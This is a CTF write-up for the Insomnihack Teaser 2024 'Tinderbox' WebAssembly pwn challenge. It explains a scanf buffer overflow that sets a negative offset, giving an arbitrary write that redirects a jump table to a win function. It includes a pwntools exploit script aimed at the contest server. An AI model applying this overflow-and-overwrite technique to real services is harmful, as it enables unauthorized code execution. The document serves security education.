---
title: 'Insomnihack teaser 2024'
challenge: 'Tinderbox'
date: 2024-01-22T00:00:00+01:00
author: 'v0lp3 & SimozB & Bonfra'
description: 'Writeup for the Insomnihack Teaser 2024 CTF challenge "TinderBox"' 
cover: '/img/Insomnihack_teaser_2024/logo.png'
tags: ['pwn', 'misc', 'wasm']
draft: false
---

```
My friend is not a great developer but he insisted to work on a prototype in C. He said he compiled the program to WebAssembly and "it is super secure" but I am doubtful.

nc tinderbox.insomnihack.ch 7171

Note: the server runs the module using `Wasmtime 16.0.0` and the runtime has access to the current directory.
```

### Quick look

The challenge attachment is a wasm file as confirmed by the `file` command.

```bash
$ file bin.wasm
bin.wasm: WebAssembly (wasm) binary module version 0x1 (MVP)
```

We can run this binary with the [Wasmtime](https://github.com/bytecodealliance/wasmtime) runtime:

```bash
$ wasmtime bin.wasm
Tell me your name:
```

We can provide arbitrary length name but no visible crash happens in any case. After we enter a string a small menu is displayed:

```bash
$ wasmtime bin.wasm
Tell me your name: naslab
1 - I made a typo in my name!
2 - Do some math for me.
3 - Tell me a joke!
```

The behavior of the options is as follows:

- (1) allows you to change the first letter of the name
- (2) take a number as input and calculate **37 - your input**
- (3) print a text

We can use the [ghidra-wasm-plugin](https://github.com/nneonneo/ghidra-wasm-plugin) to disassemble it in Ghidra.

### Vulnerability

{{< figure src="/img/Insomnihack_teaser_2024/get_name.png" position="left" caption="Get name function" captionPosition="left">}}

After disassembling it in Ghidra we immediately notice that the function `get_name` uses `scanf` with the format string `%s`. It's clearly a buffer overflow.
We can see that there is a function called `win` that we need to call to print the flag and that is referenced by a function table as shown below.

{{< figure src="/img/Insomnihack_teaser_2024/jump_table.png" position="left" caption="Function table" captionPosition="left">}}

{{< figure src="/img/Insomnihack_teaser_2024/setValues.png" position="left" caption="setValues function" captionPosition="left">}}

Some minimal refactoring later we found that the `setValues` function (traceback: `setValues` <= `fixTypo` <=  `menu` <= `__original_main`) can be abused to get arbitrary write primitive on the memory and get the flag. Here is why:

- The buffer where `name` is stored is allocated in the `__original_main` function, so the buffer overflow occurs in that function context
- The `__original_main` function defines a `jump_table_offsets` which contains some offsets that are used to call the correct function in the function table shown above.
- The `__original_main` function calls the `menu` function and passes `name`, `jump_table_offsets` pointers and a variable `name_offset` containing **0**. This offset is used in the `setValues` function as a reference to the first character of the `name` buffer. In short, it is the offset of the character modified by `fixTypo`.

{{< figure src="/img/Insomnihack_teaser_2024/original_main.png" position="left" caption="original_main function" captionPosition="left">}}

We can't use the buffer overflow directly to overwrite `jump_table_offsets` because the stack layout is the following:
*Note: in this stack representation the numbers in square bracket are refered to the size of the array.*

```
+______________________________+
|                              |
|  uint jump_table_offsets[4]  |
|______________________________|
|                              |
|        char name[16]         |
|______________________________|
|                              |
|       int name_offset        |
|______________________________|
|                              |
|           something          |
|_____________________________ |
|                              |
|              ret             |
+______________________________+

```

We can exploit this to change the values of `name_offset` to negative value, and gain arbitrary memory write with `setValues`functions. Basically we only need to modify `jump_tables_offset[1]` from value **1** to **2**, so we'll call `win` function when we run third option in the menu.

{{< figure src="/img/Insomnihack_teaser_2024/menu.png" position="left" caption="menu function" captionPosition="left">}}

After some trial and errors we found out that the right offset to modify `jump_tables_offset[1]` is **-12**. 

Here is the script used to get the flag:

```python
from pwn import *

p = remote("tinderbox.insomnihack.ch", 7171)
p.sendlineafter("name:", b"A" * 16 + p32(-12, signed=True))
p.sendlineafter("joke!", "1")
p.sendlineafter("there", "2")
p.sendlineafter("joke!", "3")

p.interactive()
```

> INS{L00k_mUm!W1th0ut_toUch1ng_RIP!}
